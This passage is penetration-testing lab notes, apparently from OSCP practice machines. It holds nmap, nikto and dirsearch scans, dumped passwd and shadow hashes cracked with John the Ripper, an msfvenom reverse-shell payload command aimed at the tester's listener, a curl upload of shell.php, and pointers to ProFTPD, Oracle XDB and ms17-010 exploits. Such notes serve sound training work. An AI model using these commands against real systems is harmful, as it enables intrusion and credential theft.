/>uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin<br />operator:x:11:0:operator:/root:/sbin/nologin<br />games:x:12:100:games:/usr/games:/sbin/nologin<br />gopher:x:13:30:gopher:/var/gopher:/sbin/nologin<br />ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin<br />nobody:x:99:99:Nobody:/:/sbin/nologin<br />dbus:x:81:81:System message bus:/:/sbin/nologin<br />vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin<br />rpm:x:37:37::/var/lib/rpm:/sbin/nologin<br />haldaemon:x:68:68:HAL daemon:/:/sbin/nologin<br />pcap:x:77:77::/var/arpwatch:/sbin/nologin<br />nscd:x:28:28:NSCD Daemon:/:/sbin/nologin<br />named:x:25:25:Named:/var/named:/sbin/nologin<br />netdump:x:34:34:Network Crash Dump user:/var/crash:/bin/bash<br />sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin<br />rpc:x:32:32:Portmapper RPC user:/:/sbin/nologin<br />mailnull:x:47:47::/var/spool/mqueue:/sbin/nologin<br />smmsp:x:51:51::/var/spool/mqueue:/sbin/nologin<br />rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin<br />nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin<br />apache:x:48:48:Apache:/var/www:/sbin/nologin<br />squid:x:23:23::/var/spool/squid:/sbin/nologin<br />webalizer:x:67:67:Webalizer:/var/www/usage:/sbin/nologin<br />xfs:x:43:43:X Font Server:/etc/X11/fs:/sbin/nologin<br />ntp:x:38:38::/etc/ntp:/sbin/nologin<br />mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash<br />bob:x:500:500::/home/bob:/bin/bash<br />alice:x:501:501::/home/alice:/bin/bash<br /></div><div class='page'><h1 class='title level-6'>/etc/shadow</h1><br/>root:$1$236Vlq03$B7t0m/g9MRJmiR/ufF4jo0:16903:0:99999:7:::<br />bin:*:13653:0:99999:7:::<br />daemon:*:13653:0:99999:7:::<br />adm:*:13653:0:99999:7:::<br />lp:*:13653:0:99999:7:::<br />sync:*:13653:0:99999:7:::<br />shutdown:*:13653:0:99999:7:::<br />halt:*:13653:0:99999:7:::<br />mail:*:13653:0:99999:7:::<br />news:*:13653:0:99999:7:::<br />uucp:*:13653:0:99999:7:::<br />operator:*:13653:0:99999:7:::<br />games:*:13653:0:99999:7:::<br />gopher:*:13653:0:99999:7:::<br />ftp:*:13653:0:99999:7:::<br />nobody:*:13653:0:99999:7:::<br />dbus:!!:13653:0:99999:7:::<br />vcsa:!!:13653:0:99999:7:::<br />rpm:!!:13653:0:99999:7:::<br />haldaemon:!!:13653:0:99999:7:::<br />pcap:!!:13653:0:99999:7:::<br />nscd:!!:13653:0:99999:7:::<br />named:!!:13653:0:99999:7:::<br />netdump:!!:13653:0:99999:7:::<br />sshd:!!:13653:0:99999:7:::<br />rpc:!!:13653:0:99999:7:::<br />mailnull:!!:13653:0:99999:7:::<br />smmsp:!!:13653:0:99999:7:::<br />rpcuser:!!:13653:0:99999:7:::<br />nfsnobody:!!:13653:0:99999:7:::<br />apache:!!:13653:0:99999:7:::<br />squid:!!:13653:0:99999:7:::<br />webalizer:!!:13653:0:99999:7:::<br />xfs:!!:13653:0:99999:7:::<br />ntp:!!:13653:0:99999:7:::<br />mysql:!!:13653:0:99999:7:::<br />bob:$1$Rrhb4lzg$Ee8/JYZjv.NimwyrSEL6R/:16903:0:99999:7:::<br />alice:$1$BfWG661G$ye24xqRQEx.nq.bZTATwf.:16917:0:99999:7:::<br />[*] Auxiliary module execution completed<br /></div><div class='page'><h1 class='title level-6'>unshadow</h1><br/>root@kali:~/Desktop/Machines/OSCP/141# john unshadow.txt <br />Warning: detected hash type &quot;md5crypt&quot;, but the string is also recognized as &quot;aix-smd5&quot;<br />Use the &quot;--format=aix-smd5&quot; option to force loading these as that type instead<br />Using default input encoding: UTF-8<br />Loaded 3 password hashes with 3 different salts (md5crypt, crypt(3) $1$ [MD5 128/128 SSE2 4x3])<br />Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status<br />0g 0:00:00:12  3/3 0g/s 14196p/s 42210c/s 42210C/s 080476..081179<br />0g 0:00:01:26  3/3 0g/s 14521p/s 43507c/s 43507C/s myh0798..myh0801<br />0g 0:00:03:35  3/3 0g/s 14645p/s 43913c/s 43913C/s skwpg..skwqu<br />0g 0:00:03:40  3/3 0g/s 14632p/s 43875c/s 43875C/s blonar1..blonaha<br />0g 0:00:09:01  3/3 0g/s 14728p/s 44175c/s 44175C/s jamet16..jamety3<br />0g 0:00:09:03  3/3 0g/s 14725p/s 44167c/s 44167C/s jmm2711..jmm2775<br />0g 0:00:10:02  3/3 0g/s 14756p/s 44262c/s 44262C/s bbrus7..bbruke<br />Session aborted<br />root@kali:~/Desktop/Machines/OSCP/141# john unshadow.txt /root/Desktop/Tools/Wordlists/<br />index.html   mintkey/     names.txt    rockyou.txt  <br />root@kali:~/Desktop/Machines/OSCP/141# john unshadow.txt --wordlist=/root/Desktop/Tools/Wordlists/rockyou.txt <br />Warning: detected hash type &quot;md5crypt&quot;, but the string is also recognized as &quot;aix-smd5&quot;<br />Use the &quot;--format=aix-smd5&quot; option to force loading these as that type instead<br />Using default input encoding: UTF-8<br />Loaded 3 password hashes with 3 different salts (md5crypt, crypt(3) $1$ [MD5 128/128 SSE2 4x3])<br />Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status<br />loading1         (alice)<br />BUGZBUNNY        (bob)<br />2g 0:00:10:08 DONE (2019-11-26 13:42) 0.003285g/s 23559p/s 43271c/s 43271C/s      123d..*7¡Vamos!<br />Use the &quot;--show&quot; option to display all of the cracked passwords reliably<br />Session completed<br /></div><div class='page'><h1 class='title level-6'>john</h1><br/>root@kali:~/Desktop/Machines/OSCP/141# john unshadow.txt --wordlist=/root/Desktop/Tools/Wordlists/rockyou.txt <br />Warning: detected hash type &quot;md5crypt&quot;, but the string is also recognized as &quot;aix-smd5&quot;<br />Use the &quot;--format=aix-smd5&quot; option to force loading these as that type instead<br />Using default input encoding: UTF-8<br />Loaded 3 password hashes with 3 different salts (md5crypt, crypt(3) $1$ [MD5 128/128 SSE2 4x3])<br />Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status<br />loading1         (alice)<br />BUGZBUNNY        (bob)<br />2g 0:00:10:08 DONE (2019-11-26 13:42) 0.003285g/s 23559p/s 43271c/s 43271C/s      123d..*7¡Vamos!<br />Use the &quot;--show&quot; option to display all of the cracked passwords reliably<br />Session completed<br /></div><div class='page'><h1 class='title level-5'>proof.txt</h1><br/>8aafac90ff1c985236b1593e84709fb0</div><div class='page'><h1 class='title level-5'>screenshot</h1><br/><a href=""><img src="images/486-1.png" alt="images/486-1.png" /></a></div><div class='page'><h1 class='title level-4'>146 Susie</h1><br/>nmap showed 21 and 22<br />a better nmap showed that ssh was running ProFTPD 1.3.3a<br />searchsploit did not have anything great<br />a quick google search got me to a github project<br /><a href="https://github.com/Muhammd/ProFTPD-1.3.3a/blob/master/ProFTPD_exploit.py">https://github.com/Muhammd/ProFTPD-1.3.3a/blob/master/ProFTPD_exploit.py</a><br /><br />his msfvenom thing did not work, so i removed the --smallest argument and it came out fine<br />msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.11.0.186 LPORT=1234 CMD=/bin/sh PrependChrootBreak=true -f python -v payload -b &#39;\x09\x0a\x0b\x0c\x0d\x20\xff&#39;<br />threw the results in the code<br />started nc listener<br />python ProFTPD_exploit.py 10.11.1.146<br />rooted<br /><br /><br /></div><div class='page'><h1 class='title level-5'>enumeration</h1><br/></div><div class='page'><h1 class='title level-6'>nmap</h1><br/>nmap 10.11.1.146<br />Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2019-11-15 11:40 EST<br />Nmap scan report for 10.11.1.146<br />Host is up (0.047s latency).<br />Not shown: 998 closed ports<br />PORT   STATE SERVICE<br />21/tcp open  ftp<br />22/tcp open  ssh<br />MAC Address: 00:50:56:89:55:BC (VMware)<br /><br />Nmap done: 1 IP address (1 host up) scanned in 2.75 seconds<br /><br /><br /><br /><br /><br />nmap -sC -sV -p- 10.11.1.146<br />Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2019-11-15 11:41 EST<br />Nmap scan report for 10.11.1.146<br />Host is up (0.038s latency).<br />Not shown: 65533 closed ports<br />PORT   STATE SERVICE VERSION<br />21/tcp open  ftp     ProFTPD 1.3.3a<br />22/tcp open  ssh     OpenSSH 5.5p1 Debian 6 (protocol 2.0)<br />| ssh-hostkey: <br />|   1024 bb:1e:db:11:2a:c7:90:96:e8:0f:f1:ce:aa:14:6a:c1 (DSA)<br />|_  2048 67:62:39:ab:ef:7b:2d:e2:70:18:fd:7d:3d:65:bf:c7 (RSA)<br />MAC Address: 00:50:56:89:55:BC (VMware)<br />Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 168.79 seconds<br />root@kali:~/Desktop/Machines/OSCP/146# <br /><br /></div><div class='page'><h1 class='title level-5'>screenshot</h1><br/><a href=""><img src="images/406-1.png" alt="images/406-1.png" /></a></div><div class='page'><h1 class='title level-5'>proof</h1><br/>78279a04f7020f4fb4599242fcfe70af</div><div class='page'><h1 class='title level-4'>202 Oracle</h1><br/>nmap showed oracle which is HUGE tell becasue it is so vulnerable<br />normal nmap showed that the machine was running oracle 9.2.0.1.0<br />searchsploit showed that exploits/windows/remote/1365.pm was a viable option<br />msfconsole &gt; use exploit/windows/http/oracle9i_xdb_pass &gt; seterup... &gt; run &gt; enjoy your shell!!<br /><br />ms17-010 also roots it for you.</div><div class='page'><h1 class='title level-5'>enumeration</h1><br/>curl <a href="http://10.11.1.202/">http://10.11.1.202/</a> --upload-file shell.php -v</div><div class='page'><h1 class='title level-6'>nmap</h1><br/>nmap 10.11.1.202<br />Starting Nmap 7.70 ( https://nmap.org ) at 2019-11-20 23:08 EST<br />Nmap scan report for 10.11.1.202<br />Host is up (0.046s latency).<br />Not shown: 982 closed ports<br />PORT     STATE SERVICE<br />21/tcp   open  ftp<br />80/tcp   open  http<br />135/tcp  open  msrpc<br />139/tcp  open  netbios-ssn<br />443/tcp  open  https<br />445/tcp  open  microsoft-ds<br />1031/tcp open  iad2<br />1034/tcp open  zincite-a<br />1035/tcp open  multidropper<br />1039/tcp open  sbl<br />1521/tcp open  oracle<br />2030/tcp open  device2<br />2100/tcp open  amiganetfs<br />3372/tcp open  msdtc<br />3389/tcp open  ms-wbt-server<br />4443/tcp open  pharos<br />7778/tcp open  interwise<br />8080/tcp open  http-proxy<br />MAC Address: 00:50:56:89:66:78 (VMware)<br /><br />Nmap done: 1 IP address (1 host up) scanned in 2.48 seconds<br />root@kali:~/Desktop/Machines/OSCP/202# <br /></div><div class='page'><h1 class='title level-6'>normal nmap</h1><br/>nmap -sC -sV -p- 10.11.1.202<br />Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2019-11-20 23:08 EST<br />Nmap scan report for 10.11.1.202<br />Host is up (0.048s latency).<br />Not shown: 65511 closed ports<br />PORT     STATE SERVICE       VERSION<br />21/tcp   open  ftp           Microsoft ftpd 5.0<br />|_ftp-anon: Anonymous FTP login allowed (FTP code 230)<br />| ftp-syst: <br />|_  SYST: Windows_NT version 5.0<br />80/tcp   open  http          Microsoft IIS httpd 5.0<br />| http-cookie-flags: <br />|   /: <br />|     ASPSESSIONIDASCSRQSQ: <br />|_      httponly flag not set<br />| http-methods: <br />|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH<br />| http-ntlm-info: <br />|   Target_Name: ACME<br />|   NetBIOS_Domain_Name: ACME<br />|   NetBIOS_Computer_Name: ORACLE<br />|   DNS_Domain_Name: acme.local<br />|   DNS_Computer_Name: oracle.acme.local<br />|_  Product_Version: 5.0.2195<br />|_http-server-header: Microsoft-IIS/5.0<br />|_http-title: Under Construction<br />| http-webdav-scan: <br />|   WebDAV type: Unkown<br />|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK<br />|   Server Type: Microsoft-IIS/5.0<br />|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH<br />|_  Server Date: Thu, 21 Nov 2019 04:12:45 GMT<br />135/tcp  open  msrpc         Microsoft Windows RPC<br />139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn<br />443/tcp  open  https?<br />445/tcp  open  microsoft-ds  Windows 2000 microsoft-ds<br />1031/tcp open  msrpc         Microsoft Windows RPC<br />1034/tcp open  msrpc         Microsoft Windows RPC<br />1035/tcp open  msrpc         Microsoft Windows RPC<br />1039/tcp open  oracle        Oracle Database<br />1521/tcp open  oracle-tns    Oracle TNS Listener 9.2.0.1.0 (for 32-bit Windows)<br />1748/tcp open  oracle-tns    Oracle TNS Listener<br />| fingerprint-strings: <br />|   oracle-tns: <br />|_    (CONNECT_DATA=(COMMAND=version))<br />1754/tcp open  oracle        Oracle Database<br />1808/tcp open  oracle-vp2?<br />1809/tcp open  oracle-vp1?<br />2030/tcp open  oracle-mts    Oracle MTS Recovery Service<br />2100/tcp open  ftp           Oracle Enterprise XML DB ftpd 9.2.0.1.0<br />| ftp-syst: <br />|_  SYST: Unix Type:9.2.0.1 Version:Oracle XML DB <br />3339/tcp open  http          Oracle HTTP Server Powered by Apache 1.3.22 (mod_plsql/3.0.9.8.3b mod_ssl/2.8.5 OpenSSL/0.9.6b mod_fastcgi/2.2.12 mod_oprocmgr/1.0 mod_perl/1.25)<br />| http-methods: <br />|_  Potentially risky methods: TRACE<br />|_http-server-header: Oracle HTTP Server Powered by Apache/1.3.22 (Win32) mod_plsql/3.0.9.8.3b mod_ssl/2.8.5 OpenSSL/0.9.6b mod_fastcgi/2.2.12 mod_oprocmgr/1.0 mod_perl/1.25<br />|_http-title: Welcome to Oracle Enterprise Manager<br />3372/tcp open  msdtc         Microsoft Distributed Transaction Coordinator<br />3389/tcp open  ms-wbt-server Microsoft Terminal Service<br />4443/tcp open  ssl/pharos?<br />|_ssl-date: 2019-11-21T04:12:46+00:00; +1s from scanner time.<br />| sslv2: <br />|   SSLv2 supported<br />|   ciphers: <br />|     SSL2_RC4_128_EXPORT40_WITH_MD5<br />|     SSL2_RC4_64_WITH_MD5<br />|     SSL2_DES_64_CBC_WITH_MD5<br />|     SSL2_RC4_128_WITH_MD5<br />|_    SSL2_DES_192_EDE3_CBC_WITH_MD5<br />7778/tcp open  http          Oracle HTTP Server Powered by Apache 1.3.22 (mod_plsql/3.0.9.8.3b mod_ssl/2.8.5 OpenSSL/0.9.6b mod_fastcgi/2.2.12 mod_oprocmgr/1.0 mod_perl/1.25)<br />|_http-generator: Mozilla/4.72 [en] (WinNT; U) [Netscape]<br />| http-methods: <br />|_  Potentially risky methods: TRACE<br />|_http-server-header: Oracle HTTP Server Powered by Apache/1.3.22 (Win32) mod_plsql/3.0.9.8.3b mod_ssl/2.8.5 OpenSSL/0.9.6b mod_fastcgi/2.2.12 mod_oprocmgr/1.0 mod_perl/1.25<br />|_http-title: Oracle HTTP Server Index<br />8080/tcp open  http          Oracle XML DB Enterprise Edition httpd 9.2.0.1.0 (Oracle9i Enterprise Edition Release)<br />| http-auth: <br />| HTTP/1.1 401 Unauthorized\x0D<br />|_  Basic realm=XDB<br />|_http-server-header: Oracle XML DB/Oracle9i Enterprise Edition Release 9.2.0.1.0 - Production<br />|_http-title: 400 Bad Request<br />8228/tcp open  unknown<br />1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at <a href="https://nmap.org/cgi-bin/submit.cgi?new-service">https://nmap.org/cgi-bin/submit.cgi?new-service</a> :<br />SF-Port1748-TCP:V=7.70%I=7%D=11/20%Time=5DD60E4B%P=i686-pc-linux-gnu%r(ora<br />SF:cle-tns,2C,&quot;\0,\0\0\x04\0\0\0\&quot;\0\0\x20\(CONNECT_DATA=\(COMMAND=version<br />SF:\)\)&quot;);<br />MAC Address: 00:50:56:89:66:78 (VMware)<br />Service Info: Host: oracle; OSs: Windows, Windows 2000; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_2000<br /><br />Host script results:<br />|_clock-skew: mean: -39m59s, deviation: 1h09m16s, median: 0s<br />|_nbstat: NetBIOS name: ORACLE, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:50:56:89:66:78 (VMware)<br />| smb-os-discovery: <br />|   OS: Windows 2000 (Windows 2000 LAN Manager)<br />|   OS CPE: cpe:/o:microsoft:windows_2000::-<br />|   Computer name: oracle<br />|   NetBIOS computer name: ORACLE\x00<br />|   Domain name: acme.local<br />|   FQDN: oracle.acme.local<br />|_  System time: 2019-11-21T06:12:44+02:00<br />| smb-security-mode: <br />|   account_used: guest<br />|   authentication_level: user<br />|   challenge_response: supported<br />|_  message_signing: disabled (dangerous, but default)<br />|_smb2-time: Protocol negotiation failed (SMB2)<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 494.61 seconds<br /></div><div class='page'><h1 class='title level-6'>nikto</h1><br/>nikto -host http://10.11.1.202:80 | tee nikto_10.11.1.202:80<br />- Nikto v2.1.6<br />---------------------------------------------------------------------------<br />+ Target IP:          10.11.1.202<br />+ Target Hostname:    10.11.1.202<br />+ Target Port:        80<br />+ Start Time:         2019-11-20 23:09:21 (GMT-5)<br />---------------------------------------------------------------------------<br />+ Server: Microsoft-IIS/5.0<br />+ The anti-clickjacking X-Frame-Options header is not present.<br />+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS<br />+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type<br />+ Cookie ASPSESSIONIDASCSRQSQ created without the httponly flag<br />+ Retrieved dasl header: &lt;DAV:sql&gt;<br />+ Retrieved dav header: 1, 2<br />+ Retrieved ms-author-via header: DAV<br />+ Uncommon header &#39;ms-author-via&#39; found, with contents: DAV<br />+ Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH <br />+ OSVDB-5646: HTTP method (&#39;Allow&#39; Header): &#39;DELETE&#39; may allow clients to remove files on the web server.<br />+ OSVDB-397: HTTP method (&#39;Allow&#39; Header): &#39;PUT&#39; method could allow clients to save files on the web server.<br />+ OSVDB-5647: HTTP method (&#39;Allow&#39; Header): &#39;MOVE&#39; may allow clients to change file locations on the web server.<br />+ Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH <br />+ OSVDB-5646: HTTP method (&#39;Public&#39; Header): &#39;DELETE&#39; may allow clients to remove files on the web server.<br />+ OSVDB-397: HTTP method (&#39;Public&#39; Header): &#39;PUT&#39; method could allow clients to save files on the web server.<br />+ OSVDB-5647: HTTP method (&#39;Public&#39; Header): &#39;MOVE&#39; may allow clients to change file locations on the web server.<br />+ WebDAV enabled (PROPPATCH SEARCH PROPFIND MKCOL LOCK COPY UNLOCK listed as allowed)<br />+ OSVDB-13431: PROPFIND HTTP verb may show the server&#39;s internal IP address: http://10.11.1.202/<br />+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST<br />+ OSVDB-877: HTTP TRACK method is active, suggesting the host is vulnerable to XST<br />+ OSVDB-2117: /: Appears to be a default IIS install.<br />+ OSVDB-3092: /localstart.asp: This may be interesting...<br />+ OSVDB-3323: /NULL.printer: Internet Printing (IPP) is enabled. Some versions have a buffer overflow/DoS in Windows 2000 that allows remote attackers to gain admin privileges via a long print request that is passed to the extension through IIS 5.0. Disabling the .printer mapping i<br />+ /portal/changelog: Vignette richtext HTML editor changelog found.<br />+ 8495 requests: 0 error(s) and 24 item(s) reported on remote host<br />+ End Time:           2019-11-20 23:32:13 (GMT-5) (1372 seconds)<br />---------------------------------------------------------------------------<br />+ 1 host(s) tested<br /></div><div class='page'><h1 class='title level-6'>dirsearch</h1><br/>python3 /root/Desktop/Tools/dirsearch/dirsearch.py -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e php -f -t 20 -u <a href="http://10.11.1.202:80">http://10.11.1.202:80</a> --simple-report dirsearchsimple_10.11.1.202:80<br /><br /> _|. _ _  _  _  _ _|_    v0.3.8<br />(_||| _) (/_(_|| (_| )<br /><br />Extensions: php | HTTP method: get | Threads: 20 | Wordlist size: 441041<br /><br />Error Log: /root/Desktop/Tools/dirsearch/logs/errors-19-11-20_23-09-22.log<br /><br />Target: <a href="http://10.11.1.202:80">http://10.11.1.202:80</a><br /><br />[23:09:22] Starting: <br />[23:09:28] 403 -  172B  - /scripts/<br />[23:09:57] 401 -    4KB - /printers/<br />[23:10:37] 401 -    4KB - /Printers/<br />[23:11:16] 403 -  172B  - /Scripts/<br />[23:33:40] 403 -  172B  - /SCRIPTS/<br />CTRL+C detected: Pausing threads, please wait...<br />[e]xit / [c]ontinue: e<br /><br />Canceled by the user<br />root@kali:~/Desktop/Machines/OSCP/202# <br /></div><div class='page'><h1 class='title level-6'>nmap smb</h1><br/>nmap -p 139,445 -vv --script=smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse 10.11.1.202<br />Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2019-11-21 00:06 EST<br />NSE: Loaded 7 scripts for scanning.<br />NSE: Script Pre-scanning.<br />NSE: Starting runlevel 1 (of 1) scan.<br />Initiating NSE at 00:06<br />Completed NSE at 00:06, 0.00s elapsed<br />Initiating ARP Ping Scan at 00:06<br />Scanning 10.11.1.202 [1 port]<br />Completed ARP Ping Scan at 00:06, 0.08s elapsed (1 total hosts)<br />Initiating Parallel DNS resolution of 1 host. at 00:06<br />Completed Parallel DNS resolution of 1 host. at 00:06, 0.08s elapsed<br />Initiating SYN Stealth Scan at 00:06<br />Scanning 10.11.1.202 [2 ports]<br />Discovered open port 445/tcp on 10.11.1.202<br />Discovered open port 139/tcp on 10.11.1.202<br />Completed SYN Stealth Scan at 00:06, 0.11s elapsed (2 total ports)<br />NSE: Script scanning 10.11.1.202.<br />NSE: Starting runlevel 1 (of 1) scan.<br />Initiating NSE at 00:06<br />Completed NSE at 00:06, 5.08s elapsed<br />Nmap scan report for 10.11.1.202<br />Host is up, received arp-response (0.044s latency).<br />Scanned at 2019-11-21 00:06:18 EST for 6s<br /><br />PORT    STATE SERVICE      REASON<br />139/tcp open  netbios-ssn  syn-ack ttl 128<br />445/tcp open  microsoft-ds syn-ack ttl 128<br />MAC Address: 00:50:56:89:66:78 (VMware)<br /><br />Host script results:<br />|_smb-vuln-ms10-054: false<br />|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)<br />| smb-vuln-ms17-010: <br />|   VULNERABLE:<br />|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)<br />|     State: VULNERABLE<br />|     IDs:  CVE:CVE-2017-0143<br />|     Risk factor: HIGH<br />|       A critical remote code execution vulnerability exists in Microsoft SMBv1<br />|        servers (ms17-010).<br />|           <br />|     Disclosure date: 2017-03-14<br />|     References:<br />|       <a href="https://technet.microsoft.com/en-us/library/security/ms17-010.aspx">https://technet.microsoft.com/en-us/library/security/ms17-010.aspx</a><br />|       <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143</a><br />|_      <a href="https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/">https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/</a><br /><br />NSE: Script Post-scanning.<br />NSE: Starting runlevel 1 (of 1) scan.<br />Initiating NSE at 00:06<br />Completed NSE at 00:06, 0.00s elapsed<br />Read data files from: /usr/bin/../share/nmap<br />Nmap done: 1 IP address (1 host up) scanned in 5.64 seconds<br />           Raw packets sent: 3 (116B) | Rcvd: 3 (116B)<br />root@kali:~/Desktop/Machines/OSCP/202# <br /></div><div class='page'><h1 class='title level-5'>proof</h1><br/>b786e69b9cf7380e2e08321c6fc17aef</div><div class='page'><h1 class='title level-5'>screenshot</h1><br/><a href=""><img src="images/462-1.png" alt="images/462-1.png" /></a></div><div class='page'><h1 class='title level-4'>219</h1><br/></div><div class='page'><h1 class='title level-5'>enumeration</h1><br/><a href="http://10.11.1.219/access.html">http://10.11.1.219/access.html</a></div><div class='page'><h1 class='title level-6'>nmap</h1><br/>PORT   STATE SERVICE REASON         VERSION<br />80/tcp open  http    syn-ack ttl 64 Apache httpd<br />|_http-server-header: Apache<br />MAC Address: 00:50:56:89:39:66 (VMware)<br /></div><div class='page'><h1 class='title level-4'>220</h1><br/></div><div class='page'><h1 class='title level-5'>enumeration</h1><br/>robert@thinc.local<br />kevin@thinc.local</div><div class='page'><h1 class='title level-6'>nmap</h1><br/>echo -e e[5me[31me[1mttl=128e[0m; echo <a href="http://www.kellyodonnell.com/content/determining-os-type-ping;">http://www.kellyodonnell.com/content/determining-os-type-ping;</a> nmap 10.11.1.220<br />ttl=128<br /><a href="http://www.kellyodonnell.com/content/determining-os-type-ping">http://www.kellyodonnell.com/content/determining-os-type-ping</a><br />Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2019-12-04 16:24 EST<br />Nmap scan report for 10.11.1.220<br />Host is up (0.050s latency).<br />Not shown: 980 closed ports<br />PORT      STATE SERVICE<br />21/tcp    open  ftp<br />53/tcp    open  domain<br />88/tcp    open  kerberos-sec<br />135/tcp   open  msrpc<br />139/tcp   open  netbios-ssn<br />389/tcp   open  ldap<br />445/tcp   open  microsoft-ds<br />464/tcp   open  kpasswd5<br />593/tcp   open  http-rpc-epmap<br />636/tcp   open  ldapssl<br />3268/tcp  open  globalcatLDAP<br />3269/tcp  open  globalcatLDAPssl<br />3389/tcp  open  ms-wbt-server<br />49152/tcp open  unknown<br />49153/tcp open  unknown<br />49154/tcp open  unknown<br />49155/tcp open  unknown<br />49157/tcp open  unknown<br />49158/tcp open  unknown<br />49165/tcp open  unknown<br />MAC Address: 00:50:56:93:7C:86 (VMware)<br /><br />Nmap done: 1 IP address (1 host up) scanned in 2.14 seconds<br /></div><div class='page'><h1 class='title level-6'>nmap reg</h1><br/>nmap -sC -sV -p- 10.11.1.220<br />Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2019-12-04 16:26 EST<br />Nmap scan report for 10.11.1.220<br />Host is up (0.044s latency).<br />Not shown: 65510 closed ports<br />PORT      STATE SERVICE       VERSION<br />21/tcp    open  ftp           FileZilla ftpd 0.9.34 beta<br />| ftp-syst: <br />|_  SYST: UNIX emulated by FileZilla<br />53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)<br />| dns-nsid: <br />|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)<br />88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2013-12-28 07:37:53Z)<br />135/tcp   open  msrpc         Microsoft Windows RPC<br />139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn<br />389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: thinc.local, Site: Default-First-Site-Name)<br />445/tcp   open  microsoft-ds  Windows Server 2008 R2 Standard 7601 Service Pack 1 microsoft-ds (workgroup: THINC)<br />464/tcp   open  kpasswd5?<br />593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0<br />636/tcp   open  tcpwrapped<br />3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: thinc.local, Site: Default-First-Site-Name)<br />3269/tcp  open  tcpwrapped<br />3389/tcp  open  ms-wbt-server Microsoft Terminal Service<br />| ssl-cert: Subject: commonName=master.thinc.local<br />| Not valid before: 2013-12-27T07:37:00<br />|_Not valid after:  2014-06-28T07:37:00<br />|_ssl-date: 2013-12-28T07:37:49+00:00; -5y341d13h54m39s from scanner time.<br />5722/tcp  open  msrpc         Microsoft Windows RPC<br />9389/tcp  open  mc-nmf        .NET Message Framing<br />47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)<br />|_http-server-header: Microsoft-HTTPAPI/2.0<br />|_http-title: Not Found<br />49152/tcp open  msrpc         Microsoft Windows RPC<br />49153/tcp open  msrpc         Microsoft Windows RPC<br />49154/tcp open  msrpc         Microsoft Windows RPC<br />49155/tcp open  msrpc         Microsoft Windows RPC<br />49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0<br />49158/tcp open  msrpc         Microsoft Windows RPC<br />49165/tcp open  msrpc         Microsoft Windows RPC<br />49173/tcp open  msrpc         Microsoft Windows RPC<br />49179/tcp open  msrpc         Microsoft Windows RPC<br />MAC Address: 00:50:56:93:7C:86 (VMware)<br />Service Info: Host: MASTER; OS: Windows; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_server_2008:r2:sp1<br /><br />Host script results:<br />|_clock-skew: mean: -2167d11h54m38s, deviation: 4h00m00s, median: -2167d13h54m39s<br />|_nbstat: NetBIOS name: MASTER, 